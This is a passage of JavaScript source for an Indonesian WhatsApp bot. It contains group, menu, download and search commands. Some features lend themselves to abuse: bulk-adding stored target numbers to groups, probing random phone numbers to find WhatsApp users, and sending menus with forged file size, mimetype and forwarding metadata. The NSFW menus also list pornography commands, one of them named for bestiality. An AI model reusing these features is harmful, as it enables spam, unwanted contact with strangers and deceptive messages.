 const userListNumbers = usersList.map((user) => user.replace('@s.whatsapp.net', ''));
 m.reply(userListNumbers.join('\n'));
 }
}
break
case 'pushmember': {
 if (!m.isGroup) return m.reply(mess.group);
 if (!isAdmins) return m.reply(mess.admin);
 if (!isBotAdmins) return m.reply(mess.botAdmin);
 
 try {
 const targetData = JSON.parse(fs.readFileSync('./database/target.json', 'utf8'));
 const targets = targetData.targets;
 
 if (targets.length === 0) {
 m.reply('Belum ada target yang ditetapkan.');
 return;
 }

 for (let i = 0; i < targets.length; i++) {
 const target = targets[i];
 await new Promise((resolve) => setTimeout(resolve, 3000)); // Delay 3 detik
 const result = await sky.groupParticipantsUpdate(m.chat, [target + '@s.whatsapp.net'], 'add');
 m.reply(`Anggota baru berhasil ditambahkan: ${target}\n${jsonformat(result)}`);
 }
 } catch (error) {
 console.error("Error reading or parsing target file:", error);
 m.reply('Terjadi kesalahan dalam membaca atau memproses file target.');
 }
}
break
case 'menugrup': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
 let docs = fs.readFileSync('./src/sky.ppt'); // Menggunakan titik koma
 let listfakedocs = [
 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
 'application/pdf'
 ];
 // Fungsi getPp untuk mengambil gambar profil
 async function getPp(sky, target) {
 try {
 const response = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 } catch (error) {
 console.error('Error fetching profile picture:', error);
 return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 }
 }

 // Ambil profile picture menggunakan getPp
 let profile = await getPp(sky, m.sender);

 const menunya = `≫ MENU GRUP

> ADD
> ANTICALLOG
> ANTICHAT
> ANTIEVENT
> ANTIMEDIA
> ANTIPOLL
> ANTIPUSHKONTAK1
> ANTIPUSHKONTAK2
> ANTIVIEWONCE
> ANTILINKALL
> ANTILINKFACEBOOK
> ANTILINKGC
> ANTILINKINSTAGRAM
> ANTILINKTIKTOK
> ANTILINKTWITTER
> ANTILINKYOUTUBE
> ANTIVIRTEXT
> ANTIWAME
> AUTOSTICKER
> BC
> CEKMEMBER
> CEKPROVIDER
> CLOSETIME
> DEMOTE
> DEMOTEALL
> EDITINFO
> EPHEMERAL
> GETALLPPMEMBER
> GETPP
> GETPPGC
> GROUP
> HALAH
> HIDETAG
> HIDETAG
> JAM
> KICK
> KICKRANDOM
> LINK GRUP
> LISTONLINE
> MUTE
> OPENTIME
> PICK
> PROMOTE
> PROMOTEALL
> RANDOMKON
> RANDOMPROMOTE
> RANDOMTAG
> SAFEBOORU
> SETDESC
> SETNAME
> SETPPGC
> TAG
> TAG2
> TAGALL
> TAGALL2
> TAGALL3
> WELCOME`
 await sky.sendMessage(m.chat, {
 document: docs,
 fileName: `Hai Kak ${pushname}`,
 mimetype: pickRandom(listfakedocs),
 fileLength: 100000000000, // Sesuaikan dengan ukuran file yang lebih realistis
 pageCount: 999, // Sesuaikan dengan dokumen yang dikirim
 caption: menunya,
 contextInfo: {
 mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
 forwardingScore: 10,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '0@newsletter',
 serverMessageId: null,
 newsletterName: 'Hello Everyone My name is Avosky'
 },
 externalAdReply: {
 title: `${hariini} ⏲️`,
 body: `${runtime(uptime)}`,
 showAdAttribution: true,
 thumbnailUrl: profile, // Menggunakan profil yang didapat dari getPp
 mediaType: 1,
 previewType: 0,
 renderLargerThumbnail: true,
 mediaUrl: 'https://avosky.com',
 sourceUrl: 'https://avosky.com'
 }
 }
 }, { quoted: fkontak });
}
break

case 'menunsfw': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
 let docs = fs.readFileSync('./src/sky.ppt'); // Menggunakan titik koma
 let listfakedocs = [
 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
 'application/pdf'
 ];
 // Fungsi getPp untuk mengambil gambar profil
 async function getPp(sky, target) {
 try {
 const response = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 } catch (error) {
 console.error('Error fetching profile picture:', error);
 return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 }
 }

 // Ambil profile picture menggunakan getPp
 let profile = await getPp(sky, m.sender);

 const menunya = `≫ MENUNSFW

> AIBOORU
> ANAL
> ALLGIRL
> BLOWJOB
> CUM
> FUCK
> GALAXYBOORU
> GELBOORU
> SAFEBOORU
> SOLO
> SOLO_MALE
> THREESOME_FFF
> THREESOME_FFM
> THREESOME_MMF
> TBIB
> YAOI
> YURI`
 await sky.sendMessage(m.chat, {
 document: docs,
 fileName: `Hai Kak ${pushname}`,
 mimetype: pickRandom(listfakedocs),
 fileLength: 100000000000, // Sesuaikan dengan ukuran file yang lebih realistis
 pageCount: 999, // Sesuaikan dengan dokumen yang dikirim
 caption: menunya,
 contextInfo: {
 mentionedJid: [
 m.sender, 
 '0@s.whatsapp.net', 
 owner[0] + '@s.whatsapp.net', 
 '628118433336@s.whatsapp.net' // Ganti dengan nomor WhatsApp Bukalapak
 ],
 forwardingScore: 10,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '0@newsletter',
 serverMessageId: null,
 newsletterName: 'Hello Everyone My name is Avosky'
 },
 externalAdReply: {
 title: `${hariini} ⏲️`,
 body: `${runtime(uptime)}`,
 showAdAttribution: true,
 thumbnailUrl: profile, // Menggunakan profil yang didapat dari getPp
 mediaType: 1,
 previewType: 0,
 renderLargerThumbnail: true,
 mediaUrl: 'https://avosky.com',
 sourceUrl: 'https://avosky.com'
 }
 }
}, { quoted: fkontak });
}
break

case 'menuowner': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
    let docs = fs.readFileSync('./src/sky.ppt');  // Menggunakan titik koma
    let listfakedocs = [
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'application/vnd.openxmlformats-officedocument.presentationml.presentation',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'application/pdf'
    ];
    // Fungsi getPp untuk mengambil gambar profil
    async function getPp(sky, target) {
        try {
            const response = await sky.query({
                tag: "iq",
                attrs: {
                    target: target,
                    to: "@s.whatsapp.net",
                    type: "get",
                    xmlns: "w:profile:picture"
                },
                content: [{
                    tag: "picture",
                    attrs: {
                        type: "image",
                        query: "url"
                    }
                }]
            });
            return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        } catch (error) {
            console.error('Error fetching profile picture:', error);
            return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        }
    }

    // Ambil profile picture menggunakan getPp
    let profile = await getPp(sky, m.sender);

    const menunya = `≫ MENU OWNER

> ADD+
> ADDCASE
> ADDPREM
> ADDUSER
> ANTICALL
> BANCHAT
> BCALL
> BCALL2
> BCGROUP
> BLOCK
> CHAT
> DELETECASE
> DELETEUSER
> DELPREM
> DELSESI
> DETAILUSER
> GETCASE
> JOIN
> LEAVE
> LISTDB
> LISTPREM
> RESETDB
> REACT
> SAVEALL
> SETEXIF
> SETNAMEBOT
> SETPPBOT
> SETSTATUS
> SVKONTAK
> KONTAK
> TAKE
> UNBANNED
> USER
> UNBLOCK`
    await sky.sendMessage(m.chat, {
        document: docs,
        fileName: `Hai Kak ${pushname}`,
        mimetype: pickRandom(listfakedocs),
        fileLength: 100000000000,  // Sesuaikan dengan ukuran file yang lebih realistis
        pageCount: 999,  // Sesuaikan dengan dokumen yang dikirim
        caption: menunya,
        contextInfo: {
            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            forwardingScore: 10,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '0@newsletter',
                serverMessageId: null,
                newsletterName: 'Hello Everyone My name is Avosky'
            },
            externalAdReply: {
                title: `${hariini} ⏲️`,
                body: `${runtime(uptime)}`,
                showAdAttribution: true,
                thumbnailUrl: profile,  // Menggunakan profil yang didapat dari getPp
                mediaType: 1,
                previewType: 0,
                renderLargerThumbnail: true,
                mediaUrl: 'https://avosky.com',
                sourceUrl: 'https://avosky.com'
            }
        }
    }, { quoted: fkontak });
}
break;
case 'menumain': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
    let docs = fs.readFileSync('./src/sky.ppt');  // Menggunakan titik koma
    let listfakedocs = [
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'application/vnd.openxmlformats-officedocument.presentationml.presentation',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'application/pdf'
    ];
    // Fungsi getPp untuk mengambil gambar profil
    async function getPp(sky, target) {
        try {
            const response = await sky.query({
                tag: "iq",
                attrs: {
                    target: target,
                    to: "@s.whatsapp.net",
                    type: "get",
                    xmlns: "w:profile:picture"
                },
                content: [{
                    tag: "picture",
                    attrs: {
                        type: "image",
                        query: "url"
                    }
                }]
            });
            return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        } catch (error) {
            console.error('Error fetching profile picture:', error);
            return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        }
    }

    // Ambil profile picture menggunakan getPp
    let profile = await getPp(sky, m.sender);

    const menunya = `≫ MENUMAIN

> ADDMSG
> DELETE
> DELCMD
> DELMSG
> INFOCHAT
> LISTCMD
> LISTGC
> LISTMSG
> LISTONLINE
> OWNER
> PING
> QUOTED
> REALOWNER
> RUNTIME
> SETCMD
> SSWEB
> SPEEDTEST
> WANUMBER
> MENU`
    await sky.sendMessage(m.chat, {
        document: docs,
        fileName: `Hai Kak ${pushname}`,
        mimetype: pickRandom(listfakedocs),
        fileLength: 100000000000,  // Sesuaikan dengan ukuran file yang lebih realistis
        pageCount: 999,  // Sesuaikan dengan dokumen yang dikirim
        caption: menunya,
        contextInfo: {
            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            forwardingScore: 10,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '0@newsletter',
                serverMessageId: null,
                newsletterName: 'Hello Everyone My name is Avosky'
            },
            externalAdReply: {
                title: `${hariini} ⏲️`,
                body: `${runtime(uptime)}`,
                showAdAttribution: true,
                thumbnailUrl: profile,  // Menggunakan profil yang didapat dari getPp
                mediaType: 1,
                previewType: 0,
                renderLargerThumbnail: true,
                mediaUrl: 'https://avosky.com',
                sourceUrl: 'https://avosky.com'
            }
        }
    }, { quoted: fkontak });
}
break;
case 'menudown': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
 let docs = fs.readFileSync('./src/sky.ppt'); // Menggunakan titik koma
 let listfakedocs = [
 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
 'application/pdf'
 ];
 // Fungsi getPp untuk mengambil gambar profil
 async function getPp(sky, target) {
 try {
 const response = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 } catch (error) {
 console.error('Error fetching profile picture:', error);
 return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 }
 }

 // Ambil profile picture menggunakan getPp
 let profile = await getPp(sky, m.sender);

 const menunya = `≫ MENU DOWNLOAD

> AIO
> CAPCUT
> COCODL
> FACEBOOK
> FBDL
> GETMUSIC
> GETVIDEO
> IGDL
> MEDIAFIRE
> TIKTOK
> TIKTOKAUDIO
> TTSLIDE
> TWITTER
> YTMP3
> YTMP4`
 await sky.sendMessage(m.chat, {
 document: docs,
 fileName: `Hai Kak ${pushname}`,
 mimetype: pickRandom(listfakedocs),
 fileLength: 100000000000, // Sesuaikan dengan ukuran file yang lebih realistis
 pageCount: 999, // Sesuaikan dengan dokumen yang dikirim
 caption: menunya,
 contextInfo: {
 mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
 forwardingScore: 10,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '0@newsletter',
 serverMessageId: null,
 newsletterName: 'Hello Everyone My name is Avosky'
 },
 externalAdReply: {
 title: `${hariini} ⏲️`,
 body: `${runtime(uptime)}`,
 showAdAttribution: true,
 thumbnailUrl: profile, // Menggunakan profil yang didapat dari getPp
 mediaType: 1,
 previewType: 0,
 renderLargerThumbnail: true,
 mediaUrl: 'https://avosky.com',
 sourceUrl: 'https://avosky.com'
 }
 }
 }, { quoted: fkontak });
}
break

case 'menuprimbon': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
    let docs = fs.readFileSync('./src/sky.ppt');  // Menggunakan titik koma
    let listfakedocs = [
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'application/vnd.openxmlformats-officedocument.presentationml.presentation',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'application/pdf'
    ];
    // Fungsi getPp untuk mengambil gambar profil
    async function getPp(sky, target) {
        try {
            const response = await sky.query({
                tag: "iq",
                attrs: {
                    target: target,
                    to: "@s.whatsapp.net",
                    type: "get",
                    xmlns: "w:profile:picture"
                },
                content: [{
                    tag: "picture",
                    attrs: {
                        type: "image",
                        query: "url"
                    }
                }]
            });
            return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        } catch (error) {
            console.error('Error fetching profile picture:', error);
            return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        }
    }

    // Ambil profile picture menggunakan getPp
    let profile = await getPp(sky, m.sender);

    const menunya = `≫ MENU PRIMBON

> ARAHREZEKI
> ARTIMIMPI
> ARTINAMA
> COCOKNAMA
> FENGSHUI
> HARIBAIK
> HARISANGAR
> HARISIAL
> JADIANNIKAH
> KARAKTER
> KEBERUNTUNGAN
> MASASUBUR
> MEMANCING
> NOMORHOKI
> NAGAHARI
> PASANGAN
> PEKERJAAN
> PENYAKIT
> REZEKI
> RAMALCINTA
> RAMALJODOH
> SHIO
> SIFATUSAHA
> SUAMIITSTRI
> WETON
> ZODIAK`
    await sky.sendMessage(m.chat, {
        document: docs,
        fileName: `Hai Kak ${pushname}`,
        mimetype: pickRandom(listfakedocs),
        fileLength: 100000000000,  // Sesuaikan dengan ukuran file yang lebih realistis
        pageCount: 999,  // Sesuaikan dengan dokumen yang dikirim
        caption: menunya,
        contextInfo: {
            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            forwardingScore: 10,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '0@newsletter',
                serverMessageId: null,
                newsletterName: 'Hello Everyone My name is Avosky'
            },
            externalAdReply: {
                title: `${hariini} ⏲️`,
                body: `${runtime(uptime)}`,
                showAdAttribution: true,
                thumbnailUrl: profile,  // Menggunakan profil yang didapat dari getPp
                mediaType: 1,
                previewType: 0,
                renderLargerThumbnail: true,
                mediaUrl: 'https://avosky.com',
                sourceUrl: 'https://avosky.com'
            }
        }
    }, { quoted: fkontak });
}
break
case 'menusearch': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
 let docs = fs.readFileSync('./src/sky.ppt'); // Menggunakan titik koma
 let listfakedocs = [
 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
 'application/pdf'
 ];
 // Fungsi getPp untuk mengambil gambar profil
 async function getPp(sky, target) {
 try {
 const response = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 } catch (error) {
 console.error('Error fetching profile picture:', error);
 return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 }
 }

 // Ambil profile picture menggunakan getPp
 let profile = await getPp(sky, m.sender);

 const menunya = `≫ MENU SEARCH
> AIDIFF
> AINIME
> AINIME2
> ALQURAN
> ALOSEHAT
> ALLMOVIE
> ANIME
> AKAR
> AYAT
> BAHASANEGARA
> BHINNEKA
> BBCNEWS
> BILIBILI
> BERITA
> CEKNIK
> CHORD
> CRYPTO
> DEFINISI
> DETAILRESEP
> DUTAMOVIE
> EBAY
> ESTIMASI
> FADAMI
> FACTNUMBER
> GIMAGE
> GBARD
> GLOBALNEWS
> GOOGLE
> GLENEAGLES
> GORE
> GTALES
> GLOSARIUM
> HAPPYMOD
> HANIME-TAGS
> HANIME-TREND
> HEAR
> IGSTALK
> INFONEGARA
> INEWS
> INFOMOVIE
> INFOGEMPA
> INFOCUACA
> ICON
> IGODESU
> JADWALBOLA
> JADWALBIOSKOP
> JADWALTV
> JADWALTVNOW
> JARAK
> JOKEQUOTE
> KAMPUS
> KBBI
> KODEPOS
> KONSULTASISYARIAH
> KALI
> KISAHNABI
> LIPUTAN6
> METRONEWS
> MATAHARI
> MATAUANG
> NOWPLAYINGBIOSKOP
> NPM
> PINTEREST
> PANGKAT
> PORNHUB
> PORNGO
> QUOTE
> QUOTEMAKER
> RESEP
> RESEP2
> READ-GLENEAGLES
> RULE34
> SABDA
> SEARCHANIME
> SEKOLAH
> SINONIM
> SPEKHP
> SOUNDSEARCH
> TAFSIRSURAH
> TAFSIRWEB
> TEKNOLOGI
> TEMPOSEARCH
> TOXICHECK
> URLEBIRD
> WATTPAD
> WALLPAPER
> WIKIQUOTE
> WESTMANGA
> XDOWN
> XHAMSTER
> XNXXDL
> XNXXPLAY
> XNXXSEARCH
> XVIDEOSDL
> XVIDEOSPLAY
> XVIDEOSSEARCH
> VIDEOCLIP
> ZOOSEX`
 await sky.sendMessage(m.chat, {
 document: docs,
 fileName: `Hai Kak ${pushname}`,
 mimetype: pickRandom(listfakedocs),
 fileLength: 900000000000, // Sesuaikan dengan ukuran file yang lebih realistis
 pageCount: 999, // Sesuaikan dengan dokumen yang dikirim
 caption: menunya,
 contextInfo: {
 mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
 forwardingScore: 10,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '0@newsletter',
 serverMessageId: null,
 newsletterName: 'Hello Everyone My name is Avosky'
 },
 externalAdReply: {
 title: `${hariini} ⏲️`,
 body: `${runtime(uptime)}`,
 showAdAttribution: true,
 thumbnailUrl: profile, // Menggunakan profil yang didapat dari getPp
 mediaType: 1,
 previewType: 0,
 renderLargerThumbnail: true,
 mediaUrl: 'https://avosky.com',
 sourceUrl: 'https://avosky.com'
 }
 }
 }, { quoted: fkontak });
}
break

case 'hitungmundur': {
 const countLimit = parseInt(args[0]);

 if (isNaN(countLimit) || countLimit <= 0) {
 m.reply('Tentukan batas hitungan yang valid.');
 return;
 }

 let { key } = await sky.sendMessage(from, { text: 'Hitungan mundur dimulai...', previewType: 0 });//Penanda pesan yang akan diubah

 for (let i = countLimit; i >= 0; i--) {
 setTimeout(async () => {
 await sky.sendMessage(from, { text: `${i}`, edit: key });//Pengiriman pesan yang diubah
 }, (countLimit - i) * 1000); // Delay 1 detik per hitungan
 }
}
break
case 'hitung': {
 const argsSplit = args[0].split('|');
 const countLimit = parseInt(argsSplit[0]);
 const jump = parseInt(argsSplit[1]);

 if (isNaN(countLimit) || countLimit <= 0 || isNaN(jump) || jump <= 0) {
 m.reply('contoh hitung 10|2');
 return;
 }

 let { key } = await sky.sendMessage(from, { text: 'Hitungan dimulai...', previewType: 0 });//Penanda pesan yang akan diubah

 for (let i = 0; i <= countLimit; i += jump) {
 setTimeout(async () => {
 await sky.sendMessage(from, { text: `${i}`, edit: key });//Pengiriman pesan yang diubah
 }, ((i - 1) / jump) * 1000); // Delay 1 detik per hitungan
 }
}
break

case 'trigger': {
const uploadImage = require('./lib/uploadImage')
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime) {
 m.reply('Tidak ada media yang ditemukan');
 return;
 }
 const media = await sky.downloadAndSaveMediaMessage(quoted)
	const { TelegraPh } = require('./lib/uploader')
	const anu = await TelegraPh(media)
kaytid = await getBuffer(`https://some-random-api.com/canvas/overlay/triggered?avatar=${anu}`)
sky.sendVideoAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
 }
break
case 'quick': {
 if (!text) throw `mau quick apa`
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: `${pushname}`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Click To Quick`
 }), 
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"${q}\",\"id\":\".${q}\"}`
 }, 
 ],
 })
 })
 }
 }
}, {})

sky.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break
case 'linkgc': case 'linkgroup': {
let response = await sky.groupInviteCode(m.chat)
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: `${pushname}`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Link Grup : ${groupMetadata.subject}`
 }), 
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{\"display_text\":\"Klik Untuk Copy 🔗\",\"id\":\"123456789\",\"copy_code\":\"https://chat.whatsapp.com/${response}\"}`
 }, 
 ],
 })
 })
 }
 }
}, {})

sky.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

case 'copy': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: `${pushname}`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Tekan Di Bawah Ini`
 }), 
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{\"display_text\":\"Klik Untuk Copy 🔗\",\"id\":\"123456789\",\"copy_code\":\"${q}\"}`
 }, 
 ],
 })
 })
 }
 }
}, {})

sky.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break
case 'simih':{
if (!isCreator) return m.reply('nah nah ngapain')
if (!q) return m.reply(`Pilih on atau off`)
if (args[0] === "on") {
if (SimiActive) return m.reply('Already activated')
simion.push(from)
fs.writeFileSync('./database/simion.json', JSON.stringify(simion))
m.reply('Success in turning on Simi in this group')
var groupe = await sky.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
sky.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nSimi Online!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!SimiActive) return m.reply('Already deactivated')
let off = nttoxic.indexOf(from)
simion.splice(off, 1)
fs.writeFileSync('./database/simion.json', JSON.stringify(simion))
m.reply('Success in turning off Simi in this group')
} else {
 await m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
 }
 }
 break
case 'gfl': case "gantifile": {
if (!isCreator) return m.reply(`???`)
if (!text.includes("./")) return m.reply(`*• Example* : ${prefix + command} ./package.json`)
let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
if (!files.includes(m.quoted.fileName)) return m.reply("File not found") 
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await(const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(text, buffer)
m.reply(`Mengupload`)
}
break
case 'caritmn': {
 if (!isPrem) return replyprem(mess.premium);
 const PhoneNumber = require('awesome-phonenumber');
 arip1 = text.split(' | ')[0] ? text.split(' | ')[0] : '-';
 arip2 = text.split(' | ')[1] ? text.split(' | ')[1] : '-';
 
 // Jika pengguna tidak memberikan lanjutan, beri contoh penggunaan
 if (arip1 === '-' || arip2 === '-') {
 return m.reply('Contoh penggunaan: caritmn 62 | 12');
 }

 function generateRandomPhoneNumber(countryCode) {
 let phoneNumber = countryCode;
 for (let i = 0; i < 9; i++) {
 phoneNumber += Math.floor(Math.random() * `${arip2}`);
 }
 return phoneNumber;
 }

 function isWhatsAppNumber(phoneNumber) {
 const pn = new PhoneNumber(phoneNumber);
 return pn.isValid() && pn.isMobile();
 }

 async function delay(ms) {
 return new Promise(resolve => setTimeout(resolve, ms));
 }

 async function caritmn(m) {
 let randomPhoneNumber = generateRandomPhoneNumber(`${arip1}`);

 try {
 // Check if the generated random number has WhatsApp
 const isWhatsApp = await sky.onWhatsApp(`${randomPhoneNumber}@s.whatsapp.net`);
 if (isWhatsApp.length !== 0) {
 await delay(4000);
 m.reply('Berhasil mendapatkan satu orang');
 await delay(5000);

 sky.sendMessage(m.chat, {
 text: `Berhasil mendapatkan teman!\nNih Kak ${randomPhoneNumber}\nhttps://wa.me/${randomPhoneNumber.split("@")[0]}`
 });
 } else {
 // If the generated number doesn't have WhatsApp, try again
 return caritmn(m);
 }
 } catch (error) {
 console.error(error);
 m.reply('Terjadi kesalahan dalam mencari teman.');
 }
 }

 caritmn(m);
}
break





case 'gitclone': {
 const url = args[0];
 const urlParts = url.split('/');
 
 if (urlParts.length !== 5 || urlParts[0] !== 'https:' || urlParts[2] !== 'github.com') {
 return m.reply('Format URL tidak valid. Gunakan format: gitclone https://github.com/username/repository');
 }

 const user = urlParts[3];
 const repo = urlParts[4];

 const apiUrl = `https://api.github.com/repos/${user}/${repo}/zipball`;

 sky.sendMessage(m.chat, { document: { url: apiUrl }, fileName: `${repo}.zip`, mimetype: 'application/zip' }, { quoted: m })
 .catch((err) => m.reply(mess.error));
}
break
case 'hercai': {
 text1 = text.split(' | ')[0] ? text.split(' | ')[0] : '-'
 text2 = text.split(' | ')[1] ? text.split(' | ')[1] : '-'
 const { Hercai } = require('hercai');
 if (!text) throw `> Example hercai Models | query\n\n> Available Models:\n> "v2-beta"\n> "v3"\n> "lexica"\n> "prodia"\n> "simurg"\n> "animefy"\n> "raava"\n> "shonin"`
 const herc = new Hercai();
 const delay = ms => new Promise(res => setTimeout(res, ms)); // Fungsi untuk membuat delay
 herc.drawImage({ model: `${text1}`, prompt: `${text2}`, negative_prompt: "" })
 .then(async response => {
 await delay(5000); // Menambahkan delay 2 detik sebelum mengirim respons
 sky.sendMessage(m.chat, { image: { url: response.url }, caption: `Gambar Hercai` });
 })
 .catch(error => { 
 console.error(error);
 m.reply("Maaf, terjadi kesalahan saat membuat gambar Hercai.");
 });
}
break
case 'kiw': {
const baileys = require("@whiskeysockets/baileys");
const { proto } = baileys;

const getUrl = (size, bg, fc, text) => `https://dummyimage.com/${size}/${bg}/${fc}/?text=${encodeURIComponent(text)}`;

const createImage = async (size, bg, fc, text) => {
 const url = getUrl(size, bg, fc, text);
 const { imageMessage } = await baileys.generateWAMessageContent({
 image: {
 url
 }
 }, {
 upload: sky.waUploadToServer
 });
 return imageMessage;
};

const random = (x) => x[Math.floor(Math.random() * x.length)];

const _images = [
 [
 "512x512",
 "000000",
 "ffffff",
 "This image is 512x512!"
 ],
 [
 "1024x1024",
 "000000",
